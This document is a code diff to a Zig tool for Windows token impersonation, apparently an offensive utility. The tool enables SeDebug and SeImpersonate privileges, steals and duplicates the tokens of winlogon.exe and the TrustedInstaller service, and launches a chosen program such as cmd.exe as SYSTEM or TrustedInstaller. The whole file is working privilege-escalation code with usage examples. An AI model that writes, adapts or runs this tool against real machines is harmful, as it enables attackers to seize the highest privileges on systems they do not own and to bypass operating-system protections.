@@ -29,39 +29,151 @@ pub extern "advapi32" fn DuplicateTokenEx(
     phNewToken: ?*?win32.HANDLE,
 ) callconv(windows.WINAPI) win32.BOOL;
 
-// https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
-const PRIVILEGES = [_][]const u8{
-    win32.SE_DEBUG_NAME,
-    win32.SE_IMPERSONATE_NAME,
-};
-
 const Action = struct {
     const Self = @This();
 
     command: []u8,
-    hProcess: ?win32.HANDLE,
     targetPID: u32,
     tiPID: u32,
-    targetDuplicateProcessToken: ?win32.HANDLE,
-    targetProcessToken: ?win32.HANDLE,
-    sourceProcessToken: ?win32.HANDLE,
+    sPID: u32,
     allocator: std.mem.Allocator,
 
     pub fn init(allocator: std.mem.Allocator) !Self {
         return Self{
             .command = "",
-            .hProcess = undefined,
             .targetPID = 0,
             .tiPID = 0,
-            .targetDuplicateProcessToken = undefined,
-            .targetProcessToken = undefined,
-            .sourceProcessToken = undefined,
+            .sPID = 0,
             .allocator = allocator,
         };
     }
 
-    pub fn getToken(self: *Self) bool {
-        if (self.targetPID == 0 or self.tiPID == 0) {
+    pub fn GetPIDToken(pid: u32) ?win32.HANDLE {
+        var sourceProcessToken: ?win32.HANDLE = win32.INVALID_HANDLE_VALUE;
+        var hProcess: ?win32.HANDLE = win32.INVALID_HANDLE_VALUE;
+
+        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
+        hProcess = win32.OpenProcess(
+            win32.PROCESS_QUERY_LIMITED_INFORMATION, // [in] DWORD dwDesiredAccess,
+            windows.TRUE, //                            [in] BOOL  bInheritHandle,
+            pid, //                                     [in] DWORD dwProcessId
+        );
+        defer _ = Action.CloseHandle(hProcess);
+        const result = @intFromEnum(win32.GetLastError());
+
+        if (result != 0) {
+            std.log.err("[!] Failed OpenProcess({d}) :: error code ({d})", .{ pid, result });
+            return win32.INVALID_HANDLE_VALUE;
+        }
+
+        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
+        if (0 == OpenProcessToken(
+            hProcess.?, //                              [in]  HANDLE  ProcessHandle,
+            win32_security.TOKEN_MAXIMUM_ALLOWED, //    [in]  DWORD   DesiredAccess,
+            &sourceProcessToken, //                     [out] PHANDLE TokenHandle
+        )) {
+            std.log.err("[!] Failed OpenProcessToken :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
+            return win32.INVALID_HANDLE_VALUE;
+        }
+
+        return sourceProcessToken;
+    }
+
+    pub fn DuplicatePIDToken(pid: u32) ?win32.HANDLE {
+        const sourceProcessToken: ?win32.HANDLE = GetPIDToken(pid);
+        var duplicateProcessToken: ?win32.HANDLE = win32.INVALID_HANDLE_VALUE;
+
+        defer _ = Action.CloseHandle(sourceProcessToken);
+
+        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
+        if (0 == win32.ImpersonateLoggedOnUser(
+            sourceProcessToken.?, // [in] HANDLE hToken
+        )) {
+            std.log.err("[!] Failed ImpersonateLoggedOnUser :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
+            return win32.INVALID_HANDLE_VALUE;
+        }
+
+        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
+        if (0 == DuplicateTokenEx(
+            sourceProcessToken.?, //                [in]           HANDLE                       hExistingToken
+            win32.MAXIMUM_ALLOWED, //               [in]           DWORD                        dwDesiredAccess
+            null, //                                [in, optional] LPSECURITY_ATTRIBUTES        lpTokenAttributes
+            win32.SecurityImpersonation, //         [in]           SECURITY_IMPERSONATION_LEVEL ImpersonationLevel
+            win32.TokenPrimary, //                  [in]           TOKEN_TYPE                   TokenType
+            &duplicateProcessToken, //              [out]          PHANDLE                      phNewToken
+        )) {
+            std.log.err("[!] Failed DuplicateTokenEx :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
+            return win32.INVALID_HANDLE_VALUE;
+        }
+
+        const result = @intFromEnum(win32.GetLastError());
+
+        if (result != 0) {
+            std.log.err("[!] Failed DuplicateTokenEx :: error code ({d})", .{result});
+            return win32.INVALID_HANDLE_VALUE;
+        }
+
+        return duplicateProcessToken;
+    }
+
+    pub fn AttemptModifyPrivilege(allocator: std.mem.Allocator, privilege: []const u8, processToken: ?win32.HANDLE) bool {
+        var tp: win32.TOKEN_PRIVILEGES = std.mem.zeroes(win32.TOKEN_PRIVILEGES);
+        var result: u32 = 0;
+
+        tp.PrivilegeCount = 1;
+        tp.Privileges[0].Attributes = win32.SE_PRIVILEGE_ENABLED;
+        var success: bool = true;
+
+        const lpName = std.fmt.allocPrintZ(allocator, "{s}", .{privilege}) catch return false;
+        std.log.debug("[+] Attempting to enable {s}\n", .{lpName});
+
+        defer allocator.free(lpName);
+
+        // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea
+        if (0 == win32.LookupPrivilegeValueA(
+            @ptrFromInt(0), //          [in, optional] LPCSTR lpSystemName,
+            lpName, //                  [in]           LPCSTR lpName,
+            &tp.Privileges[0].Luid, //  [out]          PLUID  lpLuid
+        )) {
+            std.log.err("[!] Failed LookupPrivilegeValueA :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
+            success = false;
+        }
+
+        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
+        if (0 == win32.AdjustTokenPrivileges(
+            processToken.?, //                  [in]            HANDLE            TokenHandle,
+            0, //                               [in]            BOOL              DisableAllPrivileges,
+            &tp, //                             [in, optional]  PTOKEN_PRIVILEGES NewState,
+            @sizeOf(win32.TOKEN_PRIVILEGES), // [in]            DWORD             BufferLength,
+            @ptrFromInt(0), //                  [out, optional] PTOKEN_PRIVILEGES PreviousState,
+            @ptrFromInt(0), //                  [out, optional] PDWORD            ReturnLength
+        )) {
+            result = @intFromEnum(win32.GetLastError());
+            if (result == @intFromEnum(win32.WIN32_ERROR.ERROR_INVALID_HANDLE)) {
+                std.log.err("[!] Failed AdjustTokenPrivileges {s} - invalid handle :: error code ({d})", .{ privilege, result });
+                success = false;
+            } else {
+                std.log.err("[!] Failed AdjustTokenPrivileges {s} :: error code ({d})", .{ privilege, result });
+            }
+        }
+
+        result = @intFromEnum(win32.GetLastError());
+        if (result != 0) { // win32.WIN32_ERROR.ERROR_SUCCESS
+            success = false;
+            if (result == 1300) { // win32.WIN32_ERROR.ERROR_NOT_ALL_ASSIGNED
+                std.log.err("[!] Failed to modify privilege {s} :: error code ({d})", .{ privilege, result });
+            } else {
+                std.log.err("[-] Failed to modify {s} :: error code ({d})", .{ privilege, result });
+            }
+        } else {
+            std.log.info("[+] Modified {s}", .{privilege});
+        }
+
+        return success;
+    }
+
+    pub fn execute(self: *Self) bool {
+        if (self.targetPID == 0 or self.tiPID == 0 or self.sPID == 0) {
             self.findPIDs();
         }
 
@@ -75,98 +187,47 @@ const Action = struct {
             return false;
         }
 
-        std.log.debug("[+] Using TI PID({d})", .{self.tiPID});
-        std.log.debug("[+] Target PID OpenProcess({d})", .{self.targetPID});
-
-        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
-        self.hProcess = win32.OpenProcess(
-            win32.PROCESS_QUERY_LIMITED_INFORMATION, // [in] DWORD dwDesiredAccess,
-            windows.TRUE, //                            [in] BOOL  bInheritHandle,
-            self.targetPID, //                          [in] DWORD dwProcessId
-        );
-        defer _ = Action.CloseHandle(self.hProcess);
-        const result = @intFromEnum(win32.GetLastError());
-
-        if (result != 0) {
-            std.log.err("[!] Failed OpenProcess({d}) :: error code ({d})", .{ self.targetPID, result });
+        if (self.sPID == 0) {
+            std.log.err("[!] Failed to locate winlogon.exe process Id :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
             return false;
         }
 
-        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
-        if (0 == OpenProcessToken(
-            self.hProcess.?, //                         [in]  HANDLE  ProcessHandle,
-            win32_security.TOKEN_MAXIMUM_ALLOWED, //    [in]  DWORD   DesiredAccess,
-            &self.sourceProcessToken, //                [out] PHANDLE TokenHandle
-        )) {
-            std.log.err("[!] Failed OpenProcessToken :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
+        std.log.debug("[+] Using System PID: {d}", .{self.sPID});
+        std.log.debug("[+] Using TI PID: {d}", .{self.tiPID});
+        std.log.debug("[+] Target PID: {d}", .{self.targetPID});
+
+        const targetProcessToken: ?win32.HANDLE = GetPIDToken(self.targetPID);
+        defer _ = Action.CloseHandle(targetProcessToken);
+
+        if (targetProcessToken.? == win32.INVALID_HANDLE_VALUE) {
+            std.log.err("[!] Failed to aquire process token for target process Id {d} :: error code :: ({d})", .{ self.targetPID, @intFromEnum(win32.GetLastError()) });
             return false;
         }
 
-        return true;
-    }
-
-    pub fn attemptModifyPrivilege(self: *Self) bool {
-        var tp: win32.TOKEN_PRIVILEGES = std.mem.zeroes(win32.TOKEN_PRIVILEGES);
-        var result: u32 = 0;
-
-        tp.PrivilegeCount = 1;
-        tp.Privileges[0].Attributes = win32.SE_PRIVILEGE_ENABLED;
-        var success: bool = true;
-
-        for (PRIVILEGES) |privilege| {
-            const lpName = std.fmt.allocPrintZ(self.allocator, "{s}", .{privilege}) catch return false;
-            std.log.debug("[+] Attempting to enable {s}\n", .{lpName});
-
-            defer self.allocator.free(lpName);
-
-            // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea
-            if (0 == win32.LookupPrivilegeValueA(
-                @ptrFromInt(0), //          [in, optional] LPCSTR lpSystemName,
-                lpName, //                  [in]           LPCSTR lpName,
-                &tp.Privileges[0].Luid, //  [out]          PLUID  lpLuid
-            )) {
-                std.log.err("[!] Failed LookupPrivilegeValueA :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
-                success = false;
-                break;
-            }
-
-            // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
-            if (0 == win32.AdjustTokenPrivileges(
-                self.sourceProcessToken, //         [in]            HANDLE            TokenHandle,
-                0, //                               [in]            BOOL              DisableAllPrivileges,
-                &tp, //                             [in, optional]  PTOKEN_PRIVILEGES NewState,
-                @sizeOf(win32.TOKEN_PRIVILEGES), // [in]            DWORD             BufferLength,
-                @ptrFromInt(0), //                  [out, optional] PTOKEN_PRIVILEGES PreviousState,
-                @ptrFromInt(0), //                  [out, optional] PDWORD            ReturnLength
-            )) {
-                result = @intFromEnum(win32.GetLastError());
-                if (result == @intFromEnum(win32.WIN32_ERROR.ERROR_INVALID_HANDLE)) {
-                    std.log.err("[!] Failed AdjustTokenPrivileges {s} - invalid handle :: error code ({d})", .{ privilege, result });
-                    success = false;
-                    break;
-                } else {
-                    std.log.err("[!] Failed AdjustTokenPrivileges {s} :: error code ({d})", .{ privilege, result });
-                }
-            }
-
-            result = @intFromEnum(win32.GetLastError());
-            if (result != 0) { // win32.WIN32_ERROR.ERROR_SUCCESS
-                success = false;
-                if (result == 1300) { // win32.WIN32_ERROR.ERROR_NOT_ALL_ASSIGNED
-                    std.log.err("[!] Failed to modify privilege {s} :: error code ({d})", .{ privilege, result });
-                } else {
-                    std.log.err("[-] Failed to modify {s} :: error code ({d})", .{ privilege, result });
-                }
-                break;
-            } else {
-                std.log.info("[+] Modified {s}", .{privilege});
-            }
+        // https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
+        if (!Action.AttemptModifyPrivilege(self.allocator, win32.SE_DEBUG_NAME, targetProcessToken)) {
+            std.log.err("[!] User does not possess SeDebugPrivilege", .{});
+            return false;
         }
 
-        return success;
-    }
+        if (!Action.AttemptModifyPrivilege(self.allocator, win32.SE_IMPERSONATE_NAME, targetProcessToken)) {
+            std.log.err("[!] User does not possess SeImpersonateNamePrivilege", .{});
+            return false;
+        }
 
-    pub fn execute(self: *Self) bool {
+        std.log.info("[+] Privileges Enabled", .{});
+
+        const systemProcessToken: ?win32.HANDLE = DuplicatePIDToken(self.sPID);
+        defer _ = Action.CloseHandle(systemProcessToken);
+        var result = @intFromEnum(win32.GetLastError());
+
+        if (systemProcessToken.? == win32.INVALID_HANDLE_VALUE) {
+            std.log.err("[-] Failed to duplicate system PID ({d}) token :: error code ({d})", .{ self.tiPID, result });
+            return false;
+        }
+
+        std.log.info("[+] Gained System", .{});
+
         var startupInfo: win32.STARTUPINFOW = std.mem.zeroes(win32.STARTUPINFOW);
         var processInformation: win32.PROCESS_INFORMATION = std.mem.zeroes(win32.PROCESS_INFORMATION);
 
@@ -179,61 +240,28 @@ const Action = struct {
             self.tiPID, //                              [in] DWORD dwProcessId
         );
         defer _ = Action.CloseHandle(processHandle);
-        var result = @intFromEnum(win32.GetLastError());
 
         if (result != 0) {
             std.log.err("[!] Failed OpenProcess({d}) :: error code ({d})", .{ self.tiPID, result });
             return false;
         }
 
-        // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
-        _ = OpenProcessToken(
-            processHandle, //                           [in]  HANDLE  ProcessHandle,
-            win32_security.TOKEN_MAXIMUM_ALLOWED, //    [in]  DWORD   DesiredAccess,
-            &self.targetProcessToken, //                [out] PHANDLE TokenHandle
-        );
-        result = @intFromEnum(win32.GetLastError());
+        const trustedInstallerProcessToken: ?win32.HANDLE = DuplicatePIDToken(self.tiPID);
+        defer Action.CloseHandle(trustedInstallerProcessToken);
 
-        if (result != 0) {
-            std.log.err("[!] Failed OpenProcessToken :: error code ({d})", .{result});
+        if (trustedInstallerProcessToken.? == win32.INVALID_HANDLE_VALUE) {
+            std.log.err("[-] Failed to duplicate TrustedInstaller PID ({d}) token :: error code ({d})", .{ self.tiPID, result });
             return false;
         }
 
-        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
-        if (0 == win32.ImpersonateLoggedOnUser(
-            self.targetProcessToken, // [in] HANDLE hToken
-        )) {
-            std.log.err("[!] Failed ImpersonateLoggedOnUser :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
-            return false;
-        }
+        std.log.info("[+] Gained Trusted Installer", .{});
 
-        // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
-        if (0 == DuplicateTokenEx(
-            self.targetProcessToken, //             [in]           HANDLE                       hExistingToken
-            win32.MAXIMUM_ALLOWED, //               [in]           DWORD                        dwDesiredAccess
-            null, //                                [in, optional] LPSECURITY_ATTRIBUTES        lpTokenAttributes
-            win32.SecurityImpersonation, //         [in]           SECURITY_IMPERSONATION_LEVEL ImpersonationLevel
-            win32.TokenPrimary, //                  [in]           TOKEN_TYPE                   TokenType
-            &self.targetDuplicateProcessToken, //   [out]          PHANDLE                      phNewToken
-        )) {
-            std.log.err("[!] Failed DuplicateTokenEx :: error code ({d})", .{@intFromEnum(win32.GetLastError())});
-            return false;
-        }
-
-        result = @intFromEnum(win32.GetLastError());
-
-        if (result != 0) {
-            std.log.err("[!] Failed DuplicateTokenEx :: error code ({d})", .{result});
-            return false;
-        }
-
-        std.log.debug("[+] CreateProcessWithTokenW({s})", .{self.command});
         const lpApplicationName = std.unicode.utf8ToUtf16LeWithNull(self.allocator, self.command) catch undefined;
         errdefer self.allocator.free(lpApplicationName);
 
         // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
         if (0 == win32.CreateProcessWithTokenW(
-            self.targetDuplicateProcessToken, //[in]                HANDLE                hToken,
+            trustedInstallerProcessToken.?, //  [in]                HANDLE                hToken,
             win32.LOGON_WITH_PROFILE, //        [in]                DWORD                 dwLogonFlags,
             lpApplicationName, //               [in, optional]      LPCWSTR               lpApplicationName,
             null, //                            [in, out, optional] LPWSTR                lpCommandLine,
@@ -278,8 +306,8 @@ const Action = struct {
 
         // https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first
         if (windows.FALSE == win32.Process32First(
-            handle, //[in]      HANDLE           hSnapshot,
-            &pe32, // [in, out] LPPROCESSENTRY32 lppe
+            handle, //  [in]      HANDLE           hSnapshot,
+            &pe32, //   [in, out] LPPROCESSENTRY32 lppe
         )) {
             return;
         }
@@ -292,18 +320,19 @@ const Action = struct {
             self.tiPID = pe32.th32ProcessID;
         }
 
-        // std.log.debug("{d}\t{s}\n", .{ pe32.th32ProcessID, pe32.szExeFile });
+        if (self.sPID == 0 and std.mem.startsWith(u8, &pe32.szExeFile, "winlogon.exe")) {
+            self.sPID = pe32.th32ProcessID;
+        }
 
-        if (self.targetPID != 0 and self.tiPID != 0) {
+        if (self.targetPID != 0 and self.tiPID != 0 and self.sPID != 0) {
             return;
         }
 
         // https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next
         while (windows.TRUE == win32.Process32Next(
-            handle, //[in]      HANDLE           hSnapshot,
-            &pe32, // [in, out] LPPROCESSENTRY32 lppe
+            handle, //  [in]      HANDLE           hSnapshot,
+            &pe32, //   [in, out] LPPROCESSENTRY32 lppe
         )) {
-            // std.log.debug("{d}\t{s}\n", .{ pe32.th32ProcessID, pe32.szExeFile });
             if (self.targetPID == 0 and pe32.th32ProcessID == pid) {
                 self.targetPID = pe32.th32ParentProcessID;
             }
@@ -312,7 +341,11 @@ const Action = struct {
                 self.tiPID = pe32.th32ProcessID;
             }
 
-            if (self.targetPID != 0 and self.tiPID != 0) {
+            if (self.sPID == 0 and std.mem.startsWith(u8, &pe32.szExeFile, "winlogon.exe")) {
+                self.sPID = pe32.th32ProcessID;
+            }
+
+            if (self.targetPID != 0 and self.tiPID != 0 and self.sPID != 0) {
                 break;
             }
         }
@@ -320,8 +353,8 @@ const Action = struct {
 
     pub fn debug(self: *Self) void {
         std.log.debug(
-            "\nTI PID:\t{d}\nTarget PID:\t{d}\nCommand:\t{s}\n",
-            .{ self.tiPID, self.targetPID, self.command },
+            "\nSystem PID:\t{d}\nTI PID:\t{d}\nTarget PID:\t{d}\nCommand:\t{s}\n",
+            .{ self.sPID, self.tiPID, self.targetPID, self.command },
         );
     }
 
@@ -342,10 +375,6 @@ const Action = struct {
 
         // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself
         _ = win32.RevertToSelf();
-
-        Action.CloseHandle(self.targetDuplicateProcessToken);
-        Action.CloseHandle(self.targetProcessToken);
-        Action.CloseHandle(self.sourceProcessToken);
     }
 
     pub fn CloseHandle(handle: ?win32.HANDLE) void {
@@ -360,9 +389,9 @@ pub fn usage(argv: []u8) !void {
     const stdout = std.io.getStdOut().writer();
 
     try stdout.print(
-        \\high2System
-        \\
-        \\  This tool exist thanks to https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962
+        \\  This tool exist thanks to: 
+        \\    * https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962
+        \\    * https://www.tiraniddo.dev/2017/08/the-art-of-becoming-trustedinstaller.html
         \\
         \\Requirements:
         \\  * SE_IMPERSONATE_NAME - "The process that calls CreateProcessWithTokenW must have this privilege."
@@ -372,9 +401,15 @@ pub fn usage(argv: []u8) !void {
         \\   <PID> <lpApplicationName>
         \\
         \\Example:
-        \\ .\\{s} 123 C:\windows\system32\cmd.exe
-        \\ .\\{s} 123 C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe
-    , .{ argv, argv });
+        \\
+        \\ .\\{s} <target PID> <TI PID> C:\windows\system32\cmd.exe
+        \\
+        \\ Spawn as TI using the current terminal PID as the <target PID>, iterate processes and attempt to locate the <TI PID>
+        \\ .\\{s} 0 0 C:\windows\system32\cmd.exe
+        \\
+        \\ Exactly as above - shorthand.
+        \\ .\\{s} 0 0
+    , .{ argv, argv, argv });
 
     std.posix.exit(0);
 }
@@ -424,18 +459,6 @@ pub fn main() !void {
     file.close();
 
     action.debug();
-
-    if (!action.getToken()) {
-        std.log.err("[!] Failed to get token for process", .{});
-        return;
-    }
-
-    if (!action.attemptModifyPrivilege()) {
-        std.log.err("[!] User does not possess SeDebugPrivilege", .{});
-        return;
-    }
-
-    std.log.info("[+] Privileges Verified and Enabled", .{});
 
     if (!action.execute()) {
         std.log.err("[!] Failed to execute {s}", .{action.command});
